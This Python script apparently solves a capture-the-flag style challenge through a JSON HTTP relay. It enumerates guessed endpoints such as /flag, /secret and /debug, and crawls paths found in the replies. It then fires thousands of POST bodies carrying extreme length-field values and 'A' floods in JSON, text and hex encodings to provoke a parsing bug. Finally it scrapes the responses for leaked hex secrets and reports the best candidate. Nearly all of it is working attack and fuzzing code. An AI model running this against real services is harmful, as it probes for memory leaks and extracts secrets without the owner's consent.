import sys, json, base64, re, itertools

def send(obj):
    print(json.dumps(obj), flush=True)
    while True:
        line = sys.stdin.readline()
        if not line:
            return None
        line = line.strip()
        if not line:
            continue
        try:
            return json.loads(line)
        except Exception:
            continue

def probe(method, path, body=None, hexbody=None, headers=None):
    m = {"method": method, "path": path}
    if body is not None:
        m["body"] = body
    if hexbody is not None:
        m["body_hex"] = hexbody
    if headers:
        m["headers"] = headers
    r = send({"http": m})
    if r is None:
        return 0, b"", ""
    b = b""
    try:
        b = base64.b64decode(r.get("body_b64") or "")
    except Exception:
        b = b""
    return r.get("status"), b, r.get("content_type") or ""

def totext(b):
    try:
        return b.decode("utf-8", "replace")
    except Exception:
        return ""

results = []  # (label, path, status, bodybytes)

DISCOVERY = ["/", "/help", "/index", "/index.html", "/health", "/api", "/api/help",
             "/api/v1", "/parse", "/record", "/records", "/docs", "/openapi.json",
             "/readme", "/info", "/status", "/debug", "/source", "/robots.txt",
             "/version", "/usage", "/upload", "/ingest", "/records/parse",
             "/api/parse", "/api/record", "/api/records", "/v1/parse", "/data",
             "/decode", "/packet", "/frame", "/proto", "/challenge", "/secret",
             "/flag", "/submit", "/rpc", "/msg", "/message", "/blob"]

disco_text = []
for p in DISCOVERY:
    st, b, ct = probe("GET", p)
    results.append(("GET", p, st, b))
    t = totext(b)
    if t:
        disco_text.append(p + "\n" + t)

blob = "\n".join(disco_text)

# discover more paths mentioned in responses
extra = set()
for m in re.finditer(r'/[A-Za-z0-9_.\-/]{2,40}', blob):
    s = m.group(0)
    if not re.search(r'\.(js|css|png|jpg|svg|ico|woff2?)$', s):
        extra.add(s)
for p in sorted(extra):
    if p not in DISCOVERY:
        st, b, ct = probe("GET", p)
        results.append(("GET", p, st, b))
        disco_text.append(p + "\n" + totext(b))
blob = "\n".join(disco_text)

PATHS = []
for p in DISCOVERY:
    PATHS.append(p)
for p in sorted(extra):
    if p not in PATHS:
        PATHS.append(p)

LENS = [2**31 - 1, 2**31, 2**32 - 1, 2**32, 2**63 - 1, 10**12, 10**9, 65535, 65536,
        0x10000, 0xFFFFFF, 127, 128, 0, -1, 2147483648, 4096, 1000000]

LKEYS = ["len", "length", "size", "n", "count", "num", "num_bytes", "record_len",
         "record_length", "payload_len", "data_len", "bytes", "size_bytes", "field_len",
         "namelen", "keylen", "vallen"]

def bodies_for(path):
    out = []
    for L in LENS:
        for k in LKEYS:
            out.append(('json', json.dumps({k: L, "data": "AAAA", "value": "AAAA", "payload": "AAAA"})))
            out.append(('json', json.dumps({"record": {k: L}, k: L, "id": 1, "ts": 0, "tag": "r1"})))
            out.append(('json', json.dumps([{"type": "rec", k: L, "value": "AAAA"}])))
        out.append(('text', str(L)))
        out.append(('text', "%d:AAAA" % L))
        out.append(('text', "%d\nAAAA" % L))
        out.append(('text', "len=%d&data=AAAA" % L))
        out.append(('text', "len=%d" % L))
        out.append(('text', "LEN %d DATA AAAA" % L))
        out.append(('hex', ("%08x" % (L & 0xFFFFFFFF)) + "41414141"))
        out.append(('hex', ("%04x" % (L & 0xFFFF)) + "41414141"))
        out.append(('hex', ("%016x" % (L & ((1<<64)-1))) + "41414141"))
        out.append(('hex', ("%02x" % (L & 0xFF)) + "41414141414141414141414141414141"))
        out.append(('hex', "41" * 4))
    # raw payload floods
    for n in (8, 64, 255, 256, 1024, 4096, 8192, 65535, 65536, 65537, 131072):
        out.append(('text', "A" * n))
        out.append(('json', json.dumps({"len": n, "data": "A" * min(n, 4096)})))
        out.append(('json', json.dumps({"type": "rec", "len": n, "payload": "A" * min(n, 2048)})))
    out.append(('json', json.dumps({"records": [{"len": 2**31 - 1, "data": "AAAA"}]})))
    out.append(('json', json.dumps({"n": 2**31 - 1})))
    return out

for path in PATHS:
    for kind, payload in bodies_for(path):
        if kind == 'json' or kind == 'text':
            st, b, ct = probe("POST", path, body=payload)
            results.append(("POST", path, st, b))
        else:
            st, b, ct = probe("POST", path, hexbody=payload)
            results.append(("POSThex", path, st, b))

# ---- analysis ----
hexline = re.compile(rb'[0-9a-fA-F]{16,128}')
keyhit = re.compile(r'(?i)(secret|token|flag|key|reserved)[^0-9a-z]{0,12}([0-9a-fA-F]{16,128})')

baseline_tokens = set()
for lbl, path, st, b in results:
    if lbl == "GET":
        for m in hexline.finditer(b.lower()):
            baseline_tokens.add(m.group(0).decode())

def tokens(b):
    out = []
    for m in keyhit.finditer(totext(b)):
        out.append(("key", m.group(1)))
    bl = b.lower()
    for m in hexline.finditer(bl):
        out.append(("hex", m.group(0).decode()))
    return out

best = None
best_score = -1
allcands = {}
for idx, (lbl, path, st, b) in enumerate(results):
    if not b:
        continue
    t = totext(b)
    for kind, tok in tokens(b):
        tok = tok.strip().lower()
        if len(tok) < 16:
            continue
        sc = 0
        if kind == "key":
            sc += 100
        if tok not in baseline_tokens:
            sc += 40
        if lbl != "GET":
            sc += 5
        if st and st >= 500:
            sc += 10
        if len(tok) == 64:
            sc += 6
        elif len(tok) == 32:
            sc += 4
        if re.search(r'(?i)secret|token|flag|reserved', t):
            sc += 20
        allcands.setdefault(tok, 0)
        allcands[tok] += sc
        if sc > best_score:
            best_score = sc
            best = tok

if best is None:
    best = ""

print("CLAIM:" + json.dumps({"secret_hex": best}), flush=True)